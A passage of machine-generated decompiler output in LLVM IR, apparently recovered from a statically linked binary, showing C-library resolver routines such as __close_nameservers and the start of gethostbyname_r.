  br i1 %v1_8067976, label %dec_label_pc_80679a8, label %dec_label_pc_806797c

dec_label_pc_806797c:                             ; preds = %dec_label_pc_806796a
  %v2_806797f = inttoptr i32 %v0_8067973 to i32*
  store i32 4, i32* %v2_806797f, align 4
  %v1_8067981 = call i32 @malloc(i32 %stack_var_-536.0)
  store i32 %v1_8067981, i32* %eax.global-to-local, align 4
  %v0_8067986 = load i32, i32* @esp, align 4
  %v1_8067989 = icmp eq i32 %v1_8067981, 0
  store i32 %v1_8067981, i32* @global_var_8078c7c.1716, align 4
  %v1_8067990 = icmp eq i1 %v1_8067989, false
  br i1 %v1_8067990, label %dec_label_pc_80679a0, label %dec_label_pc_8067992

dec_label_pc_8067992:                             ; preds = %dec_label_pc_806797c
  %v0_8067995 = load i32, i32* @ebx, align 4
  %v3_8067995 = inttoptr i32 %v0_8067986 to i32*
  store i32 %v0_8067995, i32* %v3_8067995, align 4
  %v1_8067996 = call i32 @free(i32 %stack_var_-536.0)
  store i32 %v1_8067996, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80679a8

dec_label_pc_80679a0:                             ; preds = %dec_label_pc_806797c
  %v0_80679a0 = load i32, i32* @global_var_8078c88.1715, align 8
  %v1_80679a0 = add i32 %v0_80679a0, 1
  store i32 %v1_80679a0, i32* @global_var_8078c88.1715, align 8
  %v0_80679a6 = load i32, i32* @ebx, align 4
  %v2_80679a6 = inttoptr i32 %v1_8067981 to i32*
  store i32 %v0_80679a6, i32* %v2_80679a6, align 4
  br label %dec_label_pc_80679a8

dec_label_pc_80679a8:                             ; preds = %dec_label_pc_806796a, %dec_label_pc_8067961, %dec_label_pc_8067950, %dec_label_pc_8067930, %dec_label_pc_8067927, %dec_label_pc_806764b, %dec_label_pc_8067992, %dec_label_pc_80679a0
  %stack_var_-536.1 = phi i32 [ %tmp, %dec_label_pc_806764b ], [ %stack_var_-536.0, %dec_label_pc_8067927 ], [ %stack_var_-536.0, %dec_label_pc_8067930 ], [ %stack_var_-536.0, %dec_label_pc_8067950 ], [ %stack_var_-536.0, %dec_label_pc_8067961 ], [ %stack_var_-536.0, %dec_label_pc_806796a ], [ %stack_var_-536.0, %dec_label_pc_80679a0 ], [ %stack_var_-536.0, %dec_label_pc_8067992 ]
  %v0_80679a8 = load i32, i32* @global_var_8078c78.1722, align 8
  store i32 %v0_80679a8, i32* %eax.global-to-local, align 4
  %v1_80679ad = icmp eq i32 %v0_80679a8, 0
  br i1 %v1_80679ad, label %dec_label_pc_80679b3, label %dec_label_pc_80679b1

dec_label_pc_80679b1:                             ; preds = %dec_label_pc_80679a8
  %v1_80679b1 = call i32 @__libc_errno(i32 %stack_var_-536.1)
  store i32 %v1_80679b1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80679b3

dec_label_pc_80679b3:                             ; preds = %dec_label_pc_80679b1, %dec_label_pc_80679a8
  %v0_80679bd = phi i32 [ %v1_80679b1, %dec_label_pc_80679b1 ], [ 0, %dec_label_pc_80679a8 ]
  %v0_80679b3 = load i32, i32* @esp, align 4
  %v1_80679b3 = add i32 %v0_80679b3, 524
  %v1_80679b9 = inttoptr i32 %v1_80679b3 to i32*
  %v2_80679b9 = load i32, i32* %v1_80679b9, align 4
  store i32 %v2_80679b9, i32* @ebx, align 4
  %v3_80679b9 = add i32 %v0_80679b3, 528
  %v1_80679ba = inttoptr i32 %v3_80679b9 to i32*
  %v2_80679ba = load i32, i32* %v1_80679ba, align 4
  store i32 %v2_80679ba, i32* @esi, align 4
  %v3_80679bb = add i32 %v0_80679b3, 536
  %v1_80679bc = inttoptr i32 %v3_80679bb to i32*
  %v2_80679bc = load i32, i32* %v1_80679bc, align 4
  store i32 %v2_80679bc, i32* @ebp, align 4
  ret i32 %v0_80679bd

; uselistorder directives
  uselistorder i32 %v1_8067981, { 0, 2, 1, 3 }
  uselistorder i32 %v3_8067955, { 1, 0, 2 }
  uselistorder i32 %v0_8067949, { 3, 0, 1, 2 }
  uselistorder i32 %v0_806793c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80678f9, { 0, 3, 2, 1, 4 }
  uselistorder i32 %stack_var_-536.0, { 1, 3, 5, 6, 7, 9, 10, 2, 4, 8, 0 }
  uselistorder i32 %v0_80678d1, { 1, 0, 2 }
  uselistorder i8* %.0, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_80678ba, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_80676ad, { 7, 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %v1_80678a3, { 1, 0 }
  uselistorder i32 %v0_806787c, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v3_8067859, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8067849, { 3, 0, 1, 2 }
  uselistorder i32 %v3_8067844, { 2, 1, 0, 3 }
  uselistorder i32 %v0_80677f0, { 1, 0, 2 }
  uselistorder i32 %v0_80677c7, { 1, 2, 0 }
  uselistorder i32 %v1_80677ab, { 1, 0 }
  uselistorder i32 %v0_806779f, { 4, 1, 2, 3, 0 }
  uselistorder i32 %v3_806779a, { 0, 2, 1, 3 }
  uselistorder i32 %v0_806778b, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v3_8067786, { 2, 1, 0, 3 }
  uselistorder i32 %v1_806774e, { 1, 0 }
  uselistorder i32 %v0_8067741, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_806773c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_80676e7, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v3_80676d0, { 1, 0 }
  uselistorder i32 %v0_80676b2, { 3, 0, 1, 2 }
  uselistorder i32 %v3_80676ad, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v3_8067672, { 0, 5, 3, 4, 1, 2, 6, 7 }
  uselistorder i32 %v6_8067629, { 1, 2, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 34, 35, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 0, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 36, 37 }
  uselistorder i32 (i32)* @__libc_errno, { 7, 1, 6, 5, 0, 3, 4, 2 }
  uselistorder i1* @df, { 10, 11, 12, 13, 1, 9, 15, 16, 22, 6, 27, 23, 24, 25, 26, 17, 14, 0, 20, 2, 3, 4, 21, 5, 7, 8, 18, 19 }
  uselistorder i32 128, { 11, 8, 12, 4, 7, 0, 19, 20, 18, 10, 1, 5, 13, 14, 15, 16, 3, 2, 6, 17, 9 }
  uselistorder i32 (i32)* @atol, { 0, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 58, { 6, 5, 1, 2, 3, 4, 0 }
  uselistorder i32 ()* @__GI_strdup, { 2, 1, 0 }
  uselistorder i32 ()* @realloc, { 1, 0, 2 }
  uselistorder i16 2, { 2, 0, 1 }
  uselistorder i32 512, { 5, 4, 6, 8, 11, 7, 12, 9, 0, 1, 2, 10, 3 }
  uselistorder i32 -16, { 29, 30, 28, 25, 10, 11, 26, 27, 41, 42, 35, 36, 32, 33, 31, 34, 37, 12, 38, 13, 39, 40, 0, 1, 2, 43, 44, 62, 63, 70, 45, 3, 48, 15, 16, 49, 50, 17, 4, 46, 47, 14, 18, 19, 66, 64, 65, 23, 69, 67, 68, 24, 51, 71, 72, 21, 57, 20, 52, 53, 54, 55, 56, 58, 59, 22, 60, 61, 5, 6, 7, 8, 9 }
  uselistorder i32 -12, { 19, 18, 15, 3, 4, 16, 17, 20, 5, 0, 21, 6, 22, 23, 24, 1, 38, 2, 25, 8, 9, 26, 27, 10, 7, 11, 28, 42, 13, 34, 12, 29, 30, 31, 32, 33, 35, 36, 14, 39, 37, 40, 41 }
  uselistorder i32* @esp, { 235, 236, 237, 238, 239, 240, 241, 242, 261, 243, 244, 245, 246, 247, 248, 249, 250, 251, 4, 252, 253, 254, 255, 256, 257, 258, 259, 260, 263, 264, 265, 266, 267, 6, 7, 268, 269, 270, 271, 8, 272, 295, 273, 274, 275, 276, 277, 278, 5, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 0, 294, 296, 297, 299, 298, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 9, 324, 325, 326, 327, 328, 329, 330, 331, 332, 1, 126, 127, 10, 128, 129, 2, 130, 131, 132, 333, 133, 134, 135, 262, 334, 335, 379, 336, 337, 11, 215, 216, 217, 218, 219, 12, 3, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 214, 380, 13, 338, 339, 340, 341, 14, 342, 343, 344, 345, 17, 346, 347, 348, 18, 349, 350, 351, 352, 353, 354, 16, 355, 356, 357, 358, 359, 360, 361, 20, 362, 363, 19, 364, 365, 366, 367, 368, 369, 21, 370, 371, 372, 373, 374, 15, 375, 376, 377, 378, 22, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 207, 208, 209, 210, 211, 212, 213 }
  uselistorder i32 ()* @skip_nospace, { 2, 1, 0 }
  uselistorder i32 ()* @skip_and_NUL_space, { 2, 1, 0 }
  uselistorder i8** @global_var_8071b09, { 1, 0 }
  uselistorder i8 3, { 8, 0, 4, 9, 6, 7, 1, 2, 5, 3 }
  uselistorder i64* @global_var_8071b08.1721, { 1, 0 }
  uselistorder i8* bitcast (i64* @global_var_8071b08.1721 to i8*), { 1, 0 }
  uselistorder i8 5, { 2, 1, 0 }
  uselistorder [17 x i8]* @global_var_80703e0.1723, { 1, 0 }
  uselistorder label %dec_label_pc_80679a8, { 7, 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8067927, { 1, 0 }
  uselistorder label %dec_label_pc_8067921, { 1, 0 }
  uselistorder label %dec_label_pc_80678eb, { 1, 0 }
  uselistorder label %dec_label_pc_80678ba, { 1, 0 }
  uselistorder label %dec_label_pc_806789c, { 1, 0 }
  uselistorder label %dec_label_pc_80677d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80677ab, { 1, 0 }
  uselistorder label %dec_label_pc_80677c7.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80678ba.backedge, { 4, 10, 9, 8, 7, 0, 1, 2, 3, 6, 5 }
  uselistorder label %dec_label_pc_8067720, { 1, 0 }
  uselistorder label %dec_label_pc_806764b, { 2, 0, 1 }
}

define i32 @__close_nameservers(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80679c3 = load i32, i32* @global_var_8078c80.1720, align 128
  %v9_80679c8 = icmp eq i32 %v0_80679c3, 134677540
  br i1 %v9_80679c8, label %dec_label_pc_80679db, label %dec_label_pc_80679cf

dec_label_pc_80679cf:                             ; preds = %entry
  %v1_80679d3 = call i32 @free(i32 %v0_80679c3)
  br label %dec_label_pc_80679db

dec_label_pc_80679db:                             ; preds = %entry, %dec_label_pc_80679cf
  store i32 0, i32* @global_var_8078c80.1720, align 128
  store i64 0, i64* @global_var_8078c84.1719, align 8
  %v0_8067a0d1 = load i32, i32* @global_var_8078c88.1715, align 8
  %v1_8067a122 = icmp eq i32 %v0_8067a0d1, 0
  %v1_8067a149 = icmp eq i1 %v1_8067a122, false
  br i1 %v1_8067a149, label %dec_label_pc_80679f1.lr.ph, label %dec_label_pc_80679db.dec_label_pc_8067a16_crit_edge

dec_label_pc_80679db.dec_label_pc_8067a16_crit_edge: ; preds = %dec_label_pc_80679db
  br label %dec_label_pc_8067a16

dec_label_pc_80679f1.lr.ph:                       ; preds = %dec_label_pc_80679db
  br label %dec_label_pc_80679f1

dec_label_pc_80679f1:                             ; preds = %dec_label_pc_80679f1.lr.ph, %dec_label_pc_80679f1
  %v0_8067a0d10 = phi i32 [ %v0_8067a0d1, %dec_label_pc_80679f1.lr.ph ], [ %v0_8067a0d, %dec_label_pc_80679f1 ]
  %v1_80679f1 = add i32 %v0_8067a0d10, -1
  %v0_80679f4 = load i32, i32* @global_var_8078c7c.1716, align 4
  store i32 %v1_80679f1, i32* @global_var_8078c88.1715, align 8
  %v2_8067a02 = mul i32 %v1_80679f1, 4
  %v3_8067a02 = add i32 %v0_80679f4, %v2_8067a02
  %v4_8067a02 = inttoptr i32 %v3_8067a02 to i32*
  %v5_8067a02 = load i32, i32* %v4_8067a02, align 4
  %v1_8067a05 = call i32 @free(i32 %v5_8067a02)
  %v0_8067a0d = load i32, i32* @global_var_8078c88.1715, align 8
  %v1_8067a12 = icmp eq i32 %v0_8067a0d, 0
  %v1_8067a14 = icmp eq i1 %v1_8067a12, false
  br i1 %v1_8067a14, label %dec_label_pc_80679f1, label %dec_label_pc_8067a16

dec_label_pc_8067a16:                             ; preds = %dec_label_pc_80679f1, %dec_label_pc_80679db.dec_label_pc_8067a16_crit_edge
  %v0_8067a19 = load i32, i32* @global_var_8078c7c.1716, align 4
  %v1_8067a1f = call i32 @free(i32 %v0_8067a19)
  store i32 0, i32* @global_var_8078c7c.1716, align 4
  ret i32 %v1_8067a1f

; uselistorder directives
  uselistorder i32 %v0_8067a0d, { 1, 0 }
  uselistorder i32 %v1_80679f1, { 1, 0 }
  uselistorder i32 %v0_80679c3, { 1, 0 }
  uselistorder i32* @global_var_8078c88.1715, { 2, 3, 0, 4, 5, 6, 7, 8, 9, 10, 11, 1, 12 }
  uselistorder i64* @global_var_8078c84.1719, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i64 0, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80679f1, { 1, 0 }
  uselistorder label %dec_label_pc_80679db, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_8067a57 = inttoptr i32 %arg3 to i32*
  %v10_8067a57 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_8067a57, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_8067a57
}

define i32 @gethostbyname_r(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  %stack_var_4 = alloca i8*, align 4
  store i8* %arg1, i8** %stack_var_4, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  store i32 22, i32* @esi, align 4
  %v0_8067a68 = load i32, i32* @ebx, align 4
  store i32 %arg5, i32* @eax, align 4
  %v5_8067a70 = icmp eq i8* %arg1, null
  store i32 %arg4, i32* @ebp, align 4
  %v1_8067a79 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_8067a79, align 4
  br i1 %v5_8067a70, label %dec_label_pc_8067d1a, label %dec_label_pc_8067a85

dec_label_pc_8067a85:                             ; preds = %entry
  store i32 -8, i32* @ebx, align 4
  %v2_8067a8b = load i32, i32* inttoptr (i32 -8 to i32*), align 8
  store i32 %v2_8067a8b, i32* @edi, align 4
  store i32 0, i32* inttoptr (i32 -8 to i32*), align 8
  %v0_8067a95 = load i32, i32* @edx, align 4
  %v0_8067a9a = load i32, i32* @eax, align 4
  %tmp48 = bitcast i8** %stack_var_4 to i32*
  %v3_8067aa65 = load i32, i32* %tmp48, align 4
  %v9_8067aaa = call i32 @__get_hosts_byname_r(i32 %v3_8067aa65, i32 2, i32 %arg2, i32 %arg3, i32 %v0_8067a9a, i32 %arg6, i32 %v0_8067a95)
  store i32 %v9_8067aaa, i32* %eax.global-to-local, align 4
  %v1_8067ab2 = icmp eq i32 %v9_8067aaa, 0
  store i32 %v9_8067aaa, i32* @esi, align 4
  %v1_8067ab6 = icmp eq i1 %v1_8067ab2, false
  br i1 %v1_8067ab6, label %dec_label_pc_8067ac0, label %dec_label_pc_8067ab8

dec_label_pc_8067ab8:                             ; preds = %dec_label_pc_8067a85
  %v0_8067ab8 = load i32, i32* @edi, align 4
  %v1_8067ab8 = load i32, i32* @ebx, align 4
  %v2_8067ab8 = inttoptr i32 %v1_8067ab8 to i32*
  store i32 %v0_8067ab8, i32* %v2_8067ab8, align 4
  br label %dec_label_pc_8067d1a

dec_label_pc_8067ac0:                             ; preds = %dec_label_pc_8067a85
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v1_8067ac4 = inttoptr i32 %arg6 to i32*
  %v2_8067ac4 = load i32, i32* %v1_8067ac4, align 4
  store i32 %v2_8067ac4, i32* %eax.global-to-local, align 4
  %v9_8067ac6 = icmp eq i32 %v2_8067ac4, 1
  br i1 %v9_8067ac6, label %dec_label_pc_8067ad9, label %dec_label_pc_8067acb

dec_label_pc_8067acb:                             ; preds = %dec_label_pc_8067ac0
  %v9_8067acb = icmp eq i32 %v2_8067ac4, 4
  br i1 %v9_8067acb, label %dec_label_pc_8067af7, label %dec_label_pc_8067ad0

dec_label_pc_8067ad0:                             ; preds = %dec_label_pc_8067acb
  %v1_8067ad0 = add i32 %v2_8067ac4, 1
  %v8_8067ad0 = icmp eq i32 %v1_8067ad0, 0
  store i32 %v1_8067ad0, i32* %eax.global-to-local, align 4
  %v1_8067ad1 = icmp eq i1 %v8_8067ad0, false
  br i1 %v1_8067ad1, label %dec_label_pc_8067d1a, label %dec_label_pc_8067ae6

dec_label_pc_8067ad9:                             ; preds = %dec_label_pc_8067ac0
  %v9_8067adb = icmp eq i32 %v9_8067aaa, 2
  %v1_8067ade = zext i1 %v9_8067adb to i32
  store i32 %v1_8067ade, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8067af7

dec_label_pc_8067ae6:                             ; preds = %dec_label_pc_8067ad0
  %v0_8067ae6 = load i32, i32* @ebx, align 4
  %v1_8067ae6 = inttoptr i32 %v0_8067ae6 to i32*
  %v2_8067ae6 = load i32, i32* %v1_8067ae6, align 4
  %v11_8067ae6 = icmp eq i32 %v2_8067ae6, 2
  %v1_8067aea = icmp eq i1 %v11_8067ae6, false
  br i1 %v1_8067aea, label %dec_label_pc_8067d1a, label %dec_label_pc_8067af7

dec_label_pc_8067af7:                             ; preds = %dec_label_pc_8067acb, %dec_label_pc_8067ae6, %dec_label_pc_8067ad9
  %storemerge11 = phi i32 [ %v1_8067ade, %dec_label_pc_8067ad9 ], [ 0, %dec_label_pc_8067ae6 ], [ 0, %dec_label_pc_8067acb ]
  store i32 %storemerge11, i32* %stack_var_-76, align 4
  store i32 %arg6, i32* %ecx.global-to-local, align 4
  store i32 -8, i32* %eax.global-to-local, align 4
  %v0_8067b03 = load i32, i32* @edi, align 4
  store i32 %v0_8067b03, i32* inttoptr (i32 -8 to i32*), align 8
  %v1_8067b06 = inttoptr i32 %arg6 to i32*
  store i32 -1, i32* %v1_8067b06, align 4
  %v3_8067b0c6 = load i32, i32* %tmp48, align 4
  %v0_8067b10.cast = inttoptr i32 %v3_8067b0c6 to i8*
  %v3_8067b10 = call i32 @strlen(i8* %v0_8067b10.cast)
  store i32 %v3_8067b10, i32* %eax.global-to-local, align 4
  %v1_8067b18 = add i32 %v3_8067b10, 1
  store i32 %v1_8067b18, i32* %ebx.global-to-local, align 4
  %v0_8067b1b = load i32, i32* @ebp, align 4
  %v7_8067b1d = icmp sgt i32 %v0_8067b1b, %v1_8067b18
  br i1 %v7_8067b1d, label %dec_label_pc_8067b23, label %dec_label_pc_8067d15

dec_label_pc_8067b23:                             ; preds = %dec_label_pc_8067af7
  %v2_8067b1b = sub i32 %v0_8067b1b, %v1_8067b18
  %v8_8067b2b = inttoptr i32 %arg3 to i8*
  %v6_8067b2f = call i32 @memcpy(i8* %v8_8067b2b, i32 %v3_8067b0c6, i32 %v1_8067b18)
  %v1_8067b38 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8067b38 = add i32 %v1_8067b38, %arg3
  store i32 %v2_8067b38, i32* @edx, align 4
  %v1_8067b3e = sub i32 0, %v2_8067b38
  %v1_8067b40 = urem i32 %v1_8067b3e, 4
  store i32 %v1_8067b40, i32* %eax.global-to-local, align 4
  %v2_8067b43 = sub i32 %v2_8067b1b, %v1_8067b40
  store i32 %v2_8067b43, i32* @ebx, align 4
  %v1_8067b45 = add i32 %v2_8067b43, -8
  store i32 %v1_8067b45, i32* %ecx.global-to-local, align 4
  %v7_8067b55 = icmp sgt i32 %v1_8067b45, 255
  br i1 %v7_8067b55, label %dec_label_pc_8067b5b, label %dec_label_pc_8067d15

dec_label_pc_8067b5b:                             ; preds = %dec_label_pc_8067b23
  %v2_8067b5b = add i32 %v1_8067b40, %v2_8067b38
  store i32 %v2_8067b5b, i32* @edi, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v1_8067b62 = add i32 %v2_8067b5b, 4
  %v2_8067b62 = inttoptr i32 %v1_8067b62 to i32*
  store i32 0, i32* %v2_8067b62, align 4
  %v0_8067b69 = load i32, i32* @edi, align 4
  %v1_8067b69 = add i32 %v0_8067b69, 16
  store i32 %v1_8067b69, i32* @esi, align 4
  %v1_8067b6c = add i32 %v0_8067b69, 8
  store i32 %v1_8067b6c, i32* @ebp, align 4
  %v0_8067b6f = load i32, i32* %eax.global-to-local, align 4
  %v2_8067b6f = inttoptr i32 %v0_8067b69 to i32*
  store i32 %v0_8067b6f, i32* %v2_8067b6f, align 4
  %v0_8067b73 = load i32, i32* @esi, align 4
  %v3_8067b748 = load i32, i32* %tmp48, align 4
  %v0_8067b78.cast = inttoptr i32 %v3_8067b748 to i8*
  %v5_8067b78 = call i32 @inet_aton(i8* %v0_8067b78.cast, i32 %v0_8067b73)
  store i32 %v5_8067b78, i32* %eax.global-to-local, align 4
  %v1_8067b80 = icmp eq i32 %v5_8067b78, 0
  br i1 %v1_8067b80, label %dec_label_pc_8067bc3, label %dec_label_pc_8067b84

dec_label_pc_8067b84:                             ; preds = %dec_label_pc_8067b5b
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  store i32 %arg5, i32* %eax.global-to-local, align 4
  %v0_8067b90 = load i32, i32* @esi, align 4
  %v1_8067b90 = load i32, i32* @edi, align 4
  %v2_8067b90 = add i32 %v1_8067b90, 8
  %v3_8067b90 = inttoptr i32 %v2_8067b90 to i32*
  store i32 %v0_8067b90, i32* %v3_8067b90, align 4
  store i32 0, i32* @esi, align 4
  %v0_8067b95 = load i32, i32* @edi, align 4
  %v1_8067b95 = load i32, i32* %edx.global-to-local, align 4
  %v2_8067b95 = add i32 %v1_8067b95, 4
  %v3_8067b95 = inttoptr i32 %v2_8067b95 to i32*
  store i32 %v0_8067b95, i32* %v3_8067b95, align 4
  %v0_8067b98 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8067b98 = load i32, i32* %edx.global-to-local, align 4
  %v2_8067b98 = inttoptr i32 %v1_8067b98 to i32*
  store i32 %v0_8067b98, i32* %v2_8067b98, align 4
  %v0_8067b9a = load i32, i32* %edx.global-to-local, align 4
  %v1_8067b9a = add i32 %v0_8067b9a, 8
  %v2_8067b9a = inttoptr i32 %v1_8067b9a to i32*
  store i32 2, i32* %v2_8067b9a, align 4
  %v0_8067ba1 = load i32, i32* %edx.global-to-local, align 4
  %v1_8067ba1 = add i32 %v0_8067ba1, 12
  %v2_8067ba1 = inttoptr i32 %v1_8067ba1 to i32*
  store i32 4, i32* %v2_8067ba1, align 4
  %v0_8067ba8 = load i32, i32* @ebp, align 4
  %v1_8067ba8 = load i32, i32* %edx.global-to-local, align 4
  %v2_8067ba8 = add i32 %v1_8067ba8, 16
  %v3_8067ba8 = inttoptr i32 %v2_8067ba8 to i32*
  store i32 %v0_8067ba8, i32* %v3_8067ba8, align 4
  %v0_8067bab = load i32, i32* %edx.global-to-local, align 4
  %v1_8067bab = load i32, i32* %eax.global-to-local, align 4
  %v2_8067bab = inttoptr i32 %v1_8067bab to i32*
  store i32 %v0_8067bab, i32* %v2_8067bab, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v0_8067bb1 = load i32, i32* @ebp, align 4
  %v1_8067bb1 = add i32 %v0_8067bb1, 4
  %v2_8067bb1 = inttoptr i32 %v1_8067bb1 to i32*
  store i32 0, i32* %v2_8067bb1, align 4
  %v0_8067bb8 = load i32, i32* %edx.global-to-local, align 4
  %v1_8067bb8 = inttoptr i32 %v0_8067bb8 to i32*
  store i32 0, i32* %v1_8067bb8, align 4
  br label %dec_label_pc_8067d1a

dec_label_pc_8067bc3:                             ; preds = %dec_label_pc_8067b5b
  %v2_8067bc3 = load i32, i32* %stack_var_-76, align 4
  %v3_8067bc3 = icmp eq i32 %v2_8067bc3, 0
  br i1 %v3_8067bc3, label %dec_label_pc_8067bd5, label %dec_label_pc_8067bc9

dec_label_pc_8067bc9:                             ; preds = %dec_label_pc_8067bc3
  store i32 %arg6, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8067c0e

dec_label_pc_8067bd5:                             ; preds = %dec_label_pc_8067bc3
  %v2_8067bdc = ptrtoint i32* %stack_var_-60 to i32
  %v2_8067bed = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8067bed, i32* %eax.global-to-local, align 4
  %v7_8067bf8 = call i32 @__dns_lookup(i8* %v0_8067b78.cast, i32 1, i32 %v2_8067bed, i32 %v2_8067bdc)
  store i32 %v7_8067bf8, i32* %eax.global-to-local, align 4
  %v2_8067c00 = icmp slt i32 %v7_8067bf8, 0
  %v1_8067c02 = icmp eq i1 %v2_8067c00, false
  br i1 %v1_8067c02, label %dec_label_pc_8067c18, label %dec_label_pc_8067c04

dec_label_pc_8067c04:                             ; preds = %dec_label_pc_8067bd5
  store i32 %arg6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8067c0e

dec_label_pc_8067c0e:                             ; preds = %dec_label_pc_8067bc9, %dec_label_pc_8067c04
  store i32 1, i32* %v1_8067ac4, align 4
  store i32 2, i32* @esi, align 4
  br label %dec_label_pc_8067d1a

dec_label_pc_8067c18:                             ; preds = %dec_label_pc_8067bd5
  %v12_8067c18 = icmp eq i32 %tmp21, 1
  %v1_8067c1d = icmp eq i1 %v12_8067c18, false
  br i1 %v1_8067c1d, label %dec_label_pc_8067cdf, label %dec_label_pc_8067c23

dec_label_pc_8067c23:                             ; preds = %dec_label_pc_8067c18
  store i32 34, i32* @esi, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 12, i32* @ebx, align 4
  store i32 12, i32* %eax.global-to-local, align 4
  %v2_8067c41 = add i32 %v2_8067b43, -20
  %v13_8067c41 = icmp slt i32 %v2_8067c41, 0
  store i32 %v2_8067c41, i32* %ecx.global-to-local, align 4
  br i1 %v13_8067c41, label %dec_label_pc_8067cfa, label %dec_label_pc_8067c6d.lr.ph

dec_label_pc_8067c6d.lr.ph:                       ; preds = %dec_label_pc_8067c23
  %v0_8067c4f = load i32, i32* @ebp, align 4
  %v2_8067c50 = add i32 %v0_8067c4f, 12
  store i32 %v2_8067c50, i32* %eax.global-to-local, align 4
  %v5_8067c54 = inttoptr i32 %v2_8067c50 to i8*
  %v5_8067c55 = call i32 @memmove(i8* %v5_8067c54, i32 0)
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v0_8067c5e = load i32, i32* @edi, align 4
  %v1_8067c5e = load i32, i32* @ebx, align 4
  %v2_8067c5e = add i32 %v0_8067c5e, 4
  %v3_8067c5e = add i32 %v2_8067c5e, %v1_8067c5e
  store i32 %v3_8067c5e, i32* @esi, align 4
  %v1_8067c65 = inttoptr i32 %tmp to i32*
  %v2_8067c65 = load i32, i32* %v1_8067c65, align 4
  %v2_8067c67 = inttoptr i32 %v3_8067c5e to i32*
  store i32 %v2_8067c65, i32* %v2_8067c67, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8067c6d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8067c6d

dec_label_pc_8067c6d:                             ; preds = %dec_label_pc_8067c6d.lr.ph, %dec_label_pc_8067c6d
  %v0_8067c6d = phi i32 [ %v0_8067c6d.pre, %dec_label_pc_8067c6d.lr.ph ], [ %v1_8067c71, %dec_label_pc_8067c6d ]
  %v1_8067c6d = load i32, i32* @ebp, align 4
  %v5_8067c6d = inttoptr i32 %v1_8067c6d to i32*
